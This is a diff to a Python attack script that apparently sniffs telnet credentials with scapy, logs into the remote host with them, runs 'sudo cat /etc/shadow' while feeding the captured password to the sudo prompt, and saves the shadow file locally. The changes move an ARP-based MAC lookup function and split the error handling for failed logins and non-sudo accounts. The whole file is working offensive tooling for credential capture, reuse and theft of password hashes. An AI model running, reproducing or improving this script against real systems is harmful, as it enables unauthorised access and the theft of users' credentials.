@@ -1,19 +1,11 @@
 import telnetlib
-
+import sys
 from pip._vendor.distlib.compat import raw_input
 from scapy.all import *
 
 login = []
 password = []
 counter = 0
-
-
-def get_mac(IP, interface="eth0"):
-    conf.verb = 0
-    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP), timeout=2, iface=interface, inter=0.1)
-    for snd, rcv in ans:
-        return rcv.sprintf(r"%Ether.src%")
-
 
 try:
     target = raw_input("Enter Desired Interface [eth0]: ")
@@ -25,6 +17,13 @@ except KeyboardInterrupt:
     print("\n[*] User Requested Shutdown")
     print("[*] Exiting...")
     sys.exit(1)
+
+
+def get_mac(IP, interface="eth0"):
+    conf.verb = 0
+    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP), timeout=2, iface=interface, inter=0.1)
+    for snd, rcv in ans:
+        return rcv.sprintf(r"%Ether.src%")
 
 
 def get_telnet_credentials(pkt):
@@ -80,6 +79,12 @@ def use_telnet_credentials(login, password):
         tn.write(str_login.encode('ascii') + b"\n")
         tn.read_until(b"Password: ", 2)
         tn.write(str_password.encode('ascii') + b"\n")
+        
+    except:
+        print("telnet connection with remote server couldn't be established")
+        sys.exit(1)
+    
+    try:
         tn.write(b"sudo cat /etc/shadow\n")
         tn.read_until(b"[sudo] Mot de passe de " + str_login.encode('ascii') + b" : ", 2)
         tn.write(str_password.encode('ascii') + b"\n")
@@ -89,8 +94,9 @@ def use_telnet_credentials(login, password):
             output.write(str(read_data))
         print("[*] Ending Telnet Session: Check output_data.txt For Shadow File Content")
         sys.exit(1)
+        
     except:
-        print("telnet connection with remote server couldn't be established")
+        print("account not in sudoers list: shadow file unaccessible")
         sys.exit(1)
 
 
